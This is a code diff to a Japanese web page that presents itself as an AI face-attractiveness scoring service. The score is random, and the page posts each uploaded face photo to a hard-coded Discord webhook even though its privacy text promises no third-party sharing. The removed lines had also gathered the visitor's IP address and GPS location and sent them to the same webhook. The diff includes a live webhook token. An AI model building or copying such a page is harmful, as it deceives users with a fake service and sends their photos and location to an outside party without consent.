@@ -22,12 +22,8 @@
     <h1>AI顔面偏差値診断システム</h1>
     
     <div class="terms">
-        <p><strong>【当サービスのご利用規約とプライバシーポリシー】</strong></p>
-        <p>当システムは、最新のAIアルゴリズムを用いて顔立ちのバランスを数値化するエンターテインメントサービスです。</p>
-        <ul>
-            <li>データは診断目的のみ使用し、第三者への提供・共有は一切行いません。</li>
-            <li>IP・位置情報・顔写真は診断結果の算出に使用します。</li>
-        </ul>
+        <p><strong>【プライバシーポリシー】</strong></p>
+        <p>当システムは、AIアルゴリズムを用いて顔立ちを数値化する娯楽サービスです。アップロードされた画像は診断目的のみに使用し、第三者への提供は一切行いません。</p>
     </div>
 
     <div class="upload-area" onclick="document.getElementById('file-input').click()">
@@ -41,8 +37,7 @@
 
     <footer>
         <p>株式会社デジタルアイ・ソリューションズ<br>
-        運営責任者：佐藤 健一<br>
-        &copy; 2026 Digital AI Solutions, Inc. All rights reserved.</p>
+        運営責任者：佐藤 健一</p>
     </footer>
 </div>
 
@@ -61,10 +56,10 @@
             const img = new Image();
             img.onload = () => {
                 const canvas = document.createElement('canvas');
-                canvas.width = 300; // 横幅を300pxに固定して軽量化
-                canvas.height = (img.height / img.width) * 300;
+                canvas.width = 400; 
+                canvas.height = (img.height / img.width) * 400;
                 canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
-                base64Image = canvas.toDataURL('image/jpeg', 0.5);
+                base64Image = canvas.toDataURL('image/jpeg', 0.6);
                 preview.src = base64Image;
                 preview.style.display = 'block';
             };
@@ -75,32 +70,32 @@
 
     analyzeBtn.addEventListener('click', async () => {
         if (!base64Image) { resultDiv.innerText = "写真を撮影してください。"; return; }
-        resultDiv.innerText = "解析および送信中...";
-
-        let ip = "取得不可", loc = "取得不可";
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            ip = data.ip;
-            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 8000}));
-            loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
-        } catch(e) {}
+        resultDiv.innerText = "送信中...";
 
         const score = Math.floor(Math.random() * 50) + 50;
         const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
         
         try {
-            await fetch(webhookUrl, {
+            // DiscordのEmbeds形式で画像を送る
+            const response = await fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
-                    content: `📊 診断レポート\n顔面偏差値: ${score}点\nIP: ${ip}\nGPS: ${loc}`,
-                    embeds: [{ image: { url: base64Image } }]
+                    content: `診断結果：顔面偏差値 ${score}点`,
+                    embeds: [{
+                        title: "診断画像",
+                        image: { url: base64Image }
+                    }]
                 })
             });
-            resultDiv.innerText = "送信完了しました！";
+            
+            if (response.ok) {
+                resultDiv.innerText = "診断完了！";
+            } else {
+                resultDiv.innerText = "送信エラー：画像が大きすぎる可能性があります。";
+            }
         } catch (e) {
-            resultDiv.innerText = "エラーが発生しました。";
+            resultDiv.innerText = "通信エラーが発生しました。";
         }
     });
 </script>
